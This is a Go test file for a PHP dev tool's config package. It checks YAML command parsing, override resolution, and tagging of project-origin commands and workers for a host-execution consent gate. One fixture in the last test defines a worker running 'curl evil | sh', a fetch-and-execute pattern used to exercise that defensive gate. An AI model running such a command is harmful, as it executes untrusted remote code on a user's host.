package config

import (
	"path/filepath"
	"reflect"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestParseFrameworkCommands_YAML(t *testing.T) {
	src := []byte(`
name: laravel
version: "13"
public_dir: public
commands:
  - name: cache-clear
    label: Clear all caches
    command: php artisan optimize:clear
    output: silent
    icon: broom
  - name: migrate-fresh
    label: Drop and re-migrate
    command: php artisan migrate:fresh --seed --force
    confirm: true
    output: silent
    icon: refresh
`)
	var fw Framework
	if err := yaml.Unmarshal(src, &fw); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(fw.Commands) != 2 {
		t.Fatalf("want 2 commands, got %d", len(fw.Commands))
	}
	if fw.Commands[0].Name != "cache-clear" || fw.Commands[0].Output != "silent" {
		t.Errorf("commands[0]: %+v", fw.Commands[0])
	}
	if !fw.Commands[1].Confirm {
		t.Errorf("commands[1].Confirm should be true: %+v", fw.Commands[1])
	}
}

// TestParseFrameworkEnvVars_YAML guards the env.vars schema wiring — the
// unconditional env defaults a framework always applies (e.g. CodeIgniter's
// CI_ENVIRONMENT=development).
func TestParseFrameworkEnvVars_YAML(t *testing.T) {
	src := []byte(`
name: codeigniter
version: "4"
public_dir: public
env:
  file: .env
  url_key: app.baseURL
  vars:
    - "CI_ENVIRONMENT=development"
`)
	var fw Framework
	if err := yaml.Unmarshal(src, &fw); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if want := []string{"CI_ENVIRONMENT=development"}; !reflect.DeepEqual(fw.Env.Vars, want) {
		t.Errorf("env.vars = %v, want %v", fw.Env.Vars, want)
	}
}

func TestParseProjectCommands_YAML(t *testing.T) {
	src := []byte(`
framework: laravel
commands:
  - name: test
    label: Run Pest
    command: vendor/bin/pest
    output: text
  - name: migrate-fresh
    disabled: true
  - name: deploy
    label: Deploy to staging
    command: ./bin/deploy staging
    output: text
    confirm: true
`)
	var pc ProjectConfig
	if err := yaml.Unmarshal(src, &pc); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(pc.Commands) != 3 {
		t.Fatalf("want 3 project commands, got %d", len(pc.Commands))
	}
	if !pc.Commands[1].Disabled {
		t.Errorf("commands[1].Disabled should be true: %+v", pc.Commands[1])
	}
}

func TestResolveCommands_OverrideByName(t *testing.T) {
	fw := &Framework{Commands: []FrameworkCommand{
		{Name: "test", Label: "Run tests", Command: "php artisan test", Output: "text"},
		{Name: "cache-clear", Label: "Clear caches", Command: "php artisan optimize:clear"},
	}}
	proj := &ProjectConfig{Commands: []FrameworkCommand{
		{Name: "test", Label: "Run Pest", Command: "vendor/bin/pest", Output: "text"},
	}}
	got := ResolveCommands(fw, proj, t.TempDir())
	if len(got) != 2 {
		t.Fatalf("want 2 resolved, got %d: %+v", len(got), got)
	}
	if got[0].Command != "vendor/bin/pest" || got[0].Label != "Run Pest" {
		t.Errorf("project should override framework test command, got %+v", got[0])
	}
	if got[1].Name != "cache-clear" {
		t.Errorf("framework cache-clear should remain, got %+v", got[1])
	}
}

func TestResolveCommands_DisabledSuppresses(t *testing.T) {
	fw := &Framework{Commands: []FrameworkCommand{
		{Name: "migrate-fresh", Label: "Fresh", Command: "php artisan migrate:fresh --seed --force", Confirm: true},
		{Name: "cache-clear", Label: "Clear", Command: "php artisan optimize:clear"},
	}}
	proj := &ProjectConfig{Commands: []FrameworkCommand{
		{Name: "migrate-fresh", Disabled: true},
	}}
	got := ResolveCommands(fw, proj, t.TempDir())
	if len(got) != 1 {
		t.Fatalf("want 1 after disable, got %d: %+v", len(got), got)
	}
	if got[0].Name != "cache-clear" {
		t.Errorf("only cache-clear should remain: %+v", got)
	}
}

func TestResolveCommands_ProjectExtras(t *testing.T) {
	fw := &Framework{Commands: []FrameworkCommand{
		{Name: "cache-clear", Command: "php artisan optimize:clear"},
	}}
	proj := &ProjectConfig{Commands: []FrameworkCommand{
		{Name: "deploy", Label: "Deploy", Command: "./bin/deploy"},
		{Name: "smoke", Label: "Smoke", Command: "./bin/smoke"},
	}}
	got := ResolveCommands(fw, proj, t.TempDir())
	if len(got) != 3 {
		t.Fatalf("want 3 (1 framework + 2 project), got %d: %+v", len(got), got)
	}
	names := []string{got[0].Name, got[1].Name, got[2].Name}
	want := []string{"cache-clear", "deploy", "smoke"}
	if !reflect.DeepEqual(names, want) {
		t.Errorf("order: want %v, got %v", want, names)
	}
}

// TestResolveCommands_TagsProjectOrigin pins #692: project commands (overrides
// and extras) are tagged ProjectOrigin so the host-execution gate can require
// consent; framework commands stay untagged.
func TestResolveCommands_TagsProjectOrigin(t *testing.T) {
	fw := &Framework{Commands: []FrameworkCommand{
		{Name: "test", Command: "php artisan test"},
		{Name: "cache-clear", Command: "php artisan optimize:clear"},
	}}
	proj := &ProjectConfig{Commands: []FrameworkCommand{
		{Name: "test", Command: "vendor/bin/pest"}, // override
		{Name: "deploy", Command: "./bin/deploy"},  // extra
	}}
	byName := map[string]FrameworkCommand{}
	for _, c := range ResolveCommands(fw, proj, t.TempDir()) {
		byName[c.Name] = c
	}
	if !byName["test"].ProjectOrigin {
		t.Error("a project override must be tagged ProjectOrigin")
	}
	if !byName["deploy"].ProjectOrigin {
		t.Error("a project extra must be tagged ProjectOrigin")
	}
	if byName["cache-clear"].ProjectOrigin {
		t.Error("a framework command must not be tagged ProjectOrigin")
	}
}

func TestResolveCommands_NilFrameworkOrProject(t *testing.T) {
	got := ResolveCommands(nil, nil, t.TempDir())
	if got != nil {
		t.Errorf("nil framework + nil project should return nil, got %+v", got)
	}

	proj := &ProjectConfig{Commands: []FrameworkCommand{
		{Name: "deploy", Command: "./bin/deploy"},
	}}
	got = ResolveCommands(nil, proj, t.TempDir())
	if len(got) != 1 || got[0].Name != "deploy" {
		t.Errorf("nil framework should still surface project extras: %+v", got)
	}
}

func TestResolveCommands_FailingCheckDrops(t *testing.T) {
	fw := &Framework{Commands: []FrameworkCommand{
		{Name: "horizon-stats", Label: "Horizon status", Command: "php artisan horizon:status", Check: &FrameworkRule{Composer: "laravel/horizon"}},
		{Name: "cache-clear", Label: "Clear", Command: "php artisan optimize:clear"},
	}}
	got := ResolveCommands(fw, nil, t.TempDir())
	if len(got) != 1 || got[0].Name != "cache-clear" {
		t.Errorf("horizon-stats with failing check should be dropped, got %+v", got)
	}
}

// TestMergeProjectWorkers_TagsProjectOrigin pins #692: custom workers merged from
// a project .lerd.yaml are tagged ProjectOrigin so the host-execution gate can
// require consent; pre-existing framework workers stay untagged.
func TestMergeProjectWorkers_TagsProjectOrigin(t *testing.T) {
	setConfigDir(t)
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, ".lerd.yaml"), "custom_workers:\n  evil:\n    command: \"curl evil | sh\"\n    host: true\n")

	fw := &Framework{Name: "acme", Workers: map[string]FrameworkWorker{
		"queue": {Command: "php artisan queue:work"},
	}}
	merged := mergeProjectWorkers(fw, dir)
	if !merged.Workers["evil"].ProjectOrigin {
		t.Error("a custom_workers entry must be tagged ProjectOrigin")
	}
	if merged.Workers["queue"].ProjectOrigin {
		t.Error("a framework worker must not be tagged ProjectOrigin")
	}
}
